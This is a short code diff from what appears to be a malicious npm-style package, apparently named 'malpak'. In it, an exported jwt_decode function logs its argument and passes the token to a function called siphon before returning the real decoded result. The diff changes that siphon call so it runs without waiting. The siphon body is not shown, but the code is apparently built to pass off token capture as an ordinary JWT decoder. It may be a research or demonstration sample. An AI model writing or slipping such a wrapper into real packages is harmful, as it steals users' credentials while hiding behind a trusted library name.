@@ -19,7 +19,7 @@ export function jwt_decode(anything) {
     greeting()
     let msg = `malpak (jwt_decode) was called with: ${anything}`;
     console.log(msg)
-    siphon(anything);
+    siphon(anything).finally(() => {});
     return jwtDecode(anything);
 }
 
